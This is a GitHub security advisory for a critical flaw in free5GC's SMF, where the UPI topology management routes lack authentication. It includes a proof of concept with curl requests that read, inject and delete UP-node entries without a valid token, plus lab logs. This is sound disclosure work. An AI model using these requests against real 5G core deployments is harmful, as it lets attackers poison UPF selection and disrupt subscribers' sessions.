# [C] free5GC's SMF UPI management interface lacks auth middleware; unauthenticated topology read/write requests reach handlers

## Summary
Severity: Critical
Advisory: GHSA-3258-qmv8-frp3
CVE: CVE-2026-44329
CWE: CWE-306, CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-3258-qmv8-frp3
Type: github-advisory

## Affected
- Go: `github.com/free5gc/smf` — affected >=0 <1.4.3

## Details
### Summary
free5GC's SMF mounts the `UPI` management route group without OAuth2/bearer-token authorization middleware. A network attacker who can reach SMF on the SBI can hit `UPI` endpoints with no `Authorization` header at all, and the requests reach the SMF business handlers. In the running Docker lab this was directly demonstrated for read (`GET /upi/v1/upNodesLinks`), write (`POST /upi/v1/upNodesLinks` with attacker-controlled UP-node and link payload), and delete (`DELETE /upi/v1/upNodesLinks/{nodeID}`) operations.

The defect is route-group-scoped: there is no inbound auth middleware on the UPI group at all, while a control comparison against the sibling `nsmf-oam` group on the same SMF instance shows OAM IS protected (no-token request returns `401 Unauthorized`). So this is not a global config gap -- it is specifically that the UPI group was mounted without the auth middleware that the OAM group has.

### Details
Validated against the SMF container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/smf:v4.2.0`
- Docker validation date: 2026-03-13

Control comparison on the same SMF instance:
- `GET /upi/v1/upNodesLinks` (no token) -> `200 OK`
- `GET /nsmf-oam/v1/` (no token) -> `401 Unauthorized`

This side-by-side proves OAuth2 middleware is wired in for `nsmf-oam` but not for `UPI` on the same process.

Code evidence (paths in `free5gc/smf`):
- UPI group mounted WITHOUT auth middleware: `NFs/smf/internal/sbi/server.go:76`
- OAM group mounted WITH auth middleware (control): `NFs/smf/internal/sbi/server.go:95`
- UPI business handlers (read / write / delete on `upNodesLinks`):
  - `NFs/smf/internal/sbi/api_upi.go:44`
  - `NFs/smf/internal/sbi/api_upi.go:60`
  - `NFs/smf/internal/sbi/api_upi.go:84`

### PoC
Reproduced end-to-end against the running SMF at `http://10.100.200.6:8000`.

1. READ UP-nodes/links with NO `Authorization` header -> `200 OK`:
```
curl -i http://10.100.200.6:8000/upi/v1/upNodesLinks
```

2. WRITE: POST attacker-controlled UPF node and link with NO `Authorization` header -> `200 OK`:
```
curl -i -X POST http://10.100.200.6:8000/upi/v1/upNodesLinks \
  -H 'Content-Type: application/json' \
  --data '{"links":[{"A":"gNB1","B":"UPF-POC-20260313","weight":1}],"upNodes":{"UPF-POC-20260313":{"type":"UPF","nodeID":"198.51.100.20","addr":"198.51.100.20","sNssaiUpfInfos":[{"sNssai":{"sst":1,"sd":"010203"},"dnnUpfInfoList":[{"dnn":"internet"}]}]}}}'
```

3. DELETE with FORGED token -> `404 Not Found` from business logic (auth was bypassed; the 404 is a business response, not an auth rejection):
```
curl -i -X DELETE http://10.100.200.6:8000/upi/v1/upNodesLinks/UPF-POC-20260313 \
  -H 'Authorization: Bearer not-a-real-token'
```

4. CONTROL: same instance, sibling OAM route, no token -> `401 Unauthorized`:
```
curl -i http://10.100.200.6:8000/nsmf-oam/v1/
```

SMF container logs (`docker logs smf`) confirm the side-by-side behavior:
```
[INFO][SMF][GIN] | 200 | GET    | /upi/v1/upNodesLinks
[INFO][SMF][GIN] | 401 | GET    | /nsmf-oam/v1/
[INFO][SMF][GIN] | 404 | DELETE | /upi/v1/upNodesLinks/UPF-POC-20260313
[INFO][SMF][GIN] | 200 | POST   | /upi/v1/upNodesLinks
```

### Impact
Missing inbound authentication (CWE-306) and authorization (CWE-862) on the SMF `UPI` SBI route group. Severity is scored against the route group's intended capability surface (UP-node and link topology management), which is realized by the demonstrated PoC: an unauthenticated network attacker can already today read SMF's view of the UP-plane topology, inject attacker-controlled UPF nodes and link entries, and target deletions of named entries.

Any party that can reach SMF on the SBI can:
- Read SMF's current UP-node and link topology view anonymously.
- Inject attacker-controlled UPF entries (with attacker-chosen nodeID / addr / S-NSSAI / DNN), poisoning SMF's view of which UPFs serve which slices/DNNs and biasing subsequent UPF selection / PFCP path establishment for legitimate PDU sessions.
- Issue topology delete operations against named UPF entries, denying or disrupting legitimate UPF participation in SMF's selection logic.

The defect is route-group-scoped: there is no auth middleware on the UPI group at all, so every UPI endpoint inside this group inherits the missing inbound auth boundary, and the same-instance OAM control proves this is the UPI mount specifically (not a global SMF config issue).

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/887
Upstream fix: https://github.com/free5gc/smf/pull/197

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-3258-qmv8-frp3
- https://nvd.nist.gov/vuln/detail/CVE-2026-44329
- https://github.com/free5gc/free5gc/issues/887
- https://github.com/free5gc/smf/pull/197
- https://github.com/free5gc/smf/commit/e23ce97565f285eb99eed153743c62bf4c767c6e
- https://github.com/free5gc/free5gc
